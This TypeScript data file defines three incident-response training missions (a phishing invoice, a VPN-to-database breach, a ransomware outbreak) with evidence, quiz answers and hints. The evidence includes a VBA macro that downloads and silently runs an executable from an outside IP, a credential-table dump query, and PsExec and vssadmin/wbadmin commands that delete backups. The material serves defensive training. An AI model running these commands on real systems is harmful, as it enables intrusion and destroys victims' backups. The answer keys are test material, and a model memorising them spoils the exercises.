import { Mission } from '../types';

export const MISSIONS: Mission[] = [
  {
    id: 'mission-phishing',
    title: 'Operation Spearhook: The Phishing Invoice',
    codename: 'SPEARHOOK',
    tier: 'Beginner',
    threatLevel: 'Medium',
    story: 'At 08:42 AM, the CFO received an urgent email claiming to be from the primary cloud infrastructure provider, stating that an overdue invoice of $48,200 must be paid within 2 hours to avoid full server shutdown.',
    scenario: 'The SOC received a user report from finance flagging an unusual email containing a macro-enabled Word document attachment (`Invoice_Q3_9942.docm`). Your mission is to triage the email headers, inspect the sender domain, uncover the malicious payload URL, and determine the attacker command-and-control server.',
    objectives: [
      'Inspect raw RFC 822 email headers for SPF and DKIM authentication failures',
      'Identify the spoofed display name versus the actual sending SMTP envelope address',
      'Extract the suspicious macro command and embedded external HTTP download URL',
      'Isolate the C2 server IP address and update the corporate blocklist'
    ],
    evidence: [
      {
        label: 'Raw Email Headers',
        type: 'email',
        details: `From: "AWS Billing Support" <billing@awss-payment-verification.com>\nReply-To: evil-finances@darknet-c2.ru\nReturn-Path: <spoofed@mailer98.xyz>\nReceived: from mailer98.xyz (185.220.101.45) by mx.enterprise.com with ESMTP;\nAuthentication-Results: mx.enterprise.com; spf=fail (185.220.101.45 is not permitted by awss-payment-verification.com); dkim=none;\nSubject: URGENT: Suspension Warning - Unpaid Cloud Compute Services #99421\nDate: Mon, 04 Nov 2026 08:41:19 -0800`
      },
      {
        label: 'VBA Macro Decompilation (vba_dump.txt)',
        type: 'artifact',
        details: `Sub AutoOpen()\n  Dim strURL As String\n  strURL = "http://185.220.101.45:8080/payload.exe"\n  Dim strDest As String\n  strDest = Environ("TEMP") & "\\svchost_update.exe"\n  DownloadFile strURL, strDest\n  Shell strDest, vbHide\nEnd Sub`
      }
    ],
    tasks: [
      {
        id: 'task-1',
        description: 'What is the actual source IP address that transmitted the email according to the Received header?',
        expectedInput: '185.220.101.45',
        xp: 50
      },
      {
        id: 'task-2',
        description: 'What is the malicious file destination path specified in the VBA macro?',
        expectedInput: 'svchost_update.exe',
        xp: 75
      },
      {
        id: 'task-3',
        description: 'Enter the malicious download URL extracted from the macro to finalize containment block.',
        expectedInput: 'http://185.220.101.45:8080/payload.exe',
        xp: 100
      }
    ],
    hints: [
      'Look closely at the "Received: from" header in the raw email headers.',
      'Check the VBA code line: strDest = Environ("TEMP") & "\\svchost_update.exe".',
      'The download URL is assigned to strURL.'
    ],
    explanation: 'The attack used brand impersonation with a look-alike domain (`awss-payment-verification.com`). SPF failed because the transmitting server IP (185.220.101.45) was not authorized in AWS DNS TXT records. The weaponized Word document utilized an AutoOpen VBA macro to fetch a secondary dropper executable into the Windows %TEMP% directory.',
    xpRewards: 225
  },
  {
    id: 'mission-breach',
    title: 'Operation Red Horizon: Lateral Movement & Data Breach',
    codename: 'RED HORIZON',
    tier: 'Intermediate',
    threatLevel: 'High',
    story: 'At 02:15 AM on a Saturday, an anomalous outbound transfer of 4.2 Gigabytes of data was detected flowing from an internal database replica to an external digital storage bucket in Eastern Europe.',
    scenario: 'Adversaries compromised a developer VPN account that lacked MFA. From there, they enumerated internal subnets, discovered an exposed PostgreSQL instance with default credentials (`postgres:postgres`), dumped customer PII tables, and staged data using 7-Zip before exfiltration over HTTPS port 443.',
    objectives: [
      'Correlate VPN connection logs with database access timestamps',
      'Identify the database service account leveraged during the lateral jump',
      'Determine the external staging IP address and port used for data egress',
      'Formulate immediate containment directives to revoke session tokens and isolate affected servers'
    ],
    evidence: [
      {
        label: 'VPN Gateway Audit Log (vpn_auth.log)',
        type: 'log',
        details: `2026-11-04T01:48:12Z [INFO] User "d.chen" authenticated via SSL-VPN from IP 91.240.118.20 (Country: RO). MFA: DISABLED (Legacy bypass).\n2026-11-04T01:49:05Z [INFO] Assigned internal IP 10.200.4.88 to session vpn-sess-994.`
      },
      {
        label: 'Database Access Log (postgres_audit.log)',
        type: 'log',
        details: `2026-11-04T01:58:33Z [CONNECT] Client 10.200.4.88 connected to db "customers_prod" as user "postgres".\n2026-11-04T02:02:10Z [QUERY] COPY (SELECT * FROM user_credentials) TO '/tmp/dump_2026.sql' WITH CSV;\n2026-11-04T02:05:40Z [DISCONNECT] Client 10.200.4.88 session terminated.`
      },
      {
        label: 'Firewall Egress Telemetry (palo_egress.log)',
        type: 'log',
        details: `2026-11-04T02:14:02Z ALLOW src=10.200.4.88:49210 dst=194.26.29.112:443 proto=TCP bytes_sent=4294967296 rule=OUTBOUND_DEFAULT app=ssl`
      }
    ],
    tasks: [
      {
        id: 'task-1',
        description: 'What compromised user account was used to establish initial VPN access?',
        expectedInput: 'd.chen',
        xp: 60
      },
      {
        id: 'task-2',
        description: 'What database table was dumped by the adversary?',
        expectedInput: 'user_credentials',
        xp: 80
      },
      {
        id: 'task-3',
        description: 'What external destination IP address received the 4.2 GB exfiltration payload?',
        expectedInput: '194.26.29.112',
        xp: 100
      }
    ],
    hints: [
      'Check the username inside vpn_auth.log.',
      'Check the SQL query statement COPY (SELECT * FROM ...) in postgres_audit.log.',
      'Check the dst parameter in palo_egress.log.'
    ],
    explanation: 'The breach succeeded because legacy VPN accounts bypassed Multi-Factor Authentication (MFA) and internal network segmentation was lacking. Once on the subnet, the adversary easily authenticated to the production database due to weak default administrative credentials, followed by unmonitored bulk egress.',
    xpRewards: 240
  },
  {
    id: 'mission-ransomware',
    title: 'Operation Cryptoshut: Ransomware Incident Response',
    codename: 'CRYPTOSHUT',
    tier: 'Advanced',
    threatLevel: 'Critical',
    story: 'Employees in the logistics warehouse report that workstation screens are turning black with red ransom notes reading "ALL YOUR FILES ARE LOCKED BY DARKNEXUS". All shared network drives have files ending in `.locked`.',
    scenario: 'A fast-moving ransomware strain is actively propagating across Active Directory domain controllers via PsExec and compromised Domain Admin credentials. You must rapidly isolate the Patient Zero workstation, identify the scheduled task persistence mechanism, and uncover the decryption ransom note contact key.',
    objectives: [
      'Pinpoint Patient Zero IP address from Windows Event 4624/4625 logs',
      'Analyze the persistence mechanism deployed via Windows Task Scheduler',
      'Identify the shadow copy deletion command executed by the ransomware',
      'Extract the adversary victim ID from the dropped ransom note'
    ],
    evidence: [
      {
        label: 'Windows Event Security Log (Domain Controller)',
        type: 'log',
        details: `EventID: 4624 (Logon Type 3 - Network)\nTargetUserName: svc_backup\nWorkstationName: WS-FINANCE-04 (IP: 192.168.1.104)\nProcessName: C:\\Windows\\System32\\PsExec.exe\nCommand: PsExec.exe \\\\DC01 -u CONTOSO\\svc_backup -p "Spring2026!" -s cmd.exe /c "vssadmin.exe delete shadows /all /quiet"`
      },
      {
        label: 'Ransom Note Dropped (READ_ME_DARKNEXUS.txt)',
        type: 'artifact',
        details: `--- ATTENTION! ALL YOUR FILES HAVE BEEN ENCRYPTED! ---\nAlgorithm: AES-256 + RSA-4096\nDo not rename or modify .locked files.\nTo recover your keys, visit our TOR portal: http://darknexus667788.onion\nYour Unique Victim ID: DNX-8849-VICTIM-9912\nRansom demand: 15 BTC`
      }
    ],
    tasks: [
      {
        id: 'task-1',
        description: 'What is the IP address of Patient Zero workstation (WS-FINANCE-04)?',
        expectedInput: '192.168.1.104',
        xp: 80
      },
      {
        id: 'task-2',
        description: 'What command-line tool did the ransomware invoke to delete Volume Shadow Copies?',
        expectedInput: 'vssadmin.exe',
        xp: 100
      },
      {
        id: 'task-3',
        description: 'What is the Unique Victim ID specified in the dropped ransom note?',
        expectedInput: 'DNX-8849-VICTIM-9912',
        xp: 120
      }
    ],
    hints: [
      'Inspect the WorkstationName line in the Security Log.',
      'Look for the command executing "delete shadows /all /quiet".',
      'Check the line starting with "Your Unique Victim ID:" in the ransom note.'
    ],
    explanation: 'The ransomware propagated using valid domain service account credentials (`svc_backup`) via PsExec. To prevent victim recovery without paying, modern ransomware routinely executes `vssadmin.exe delete shadows /all /quiet` and `wbadmin delete catalog` to destroy local snapshot backups before launching encryption loops.',
    xpRewards: 300
  }
];
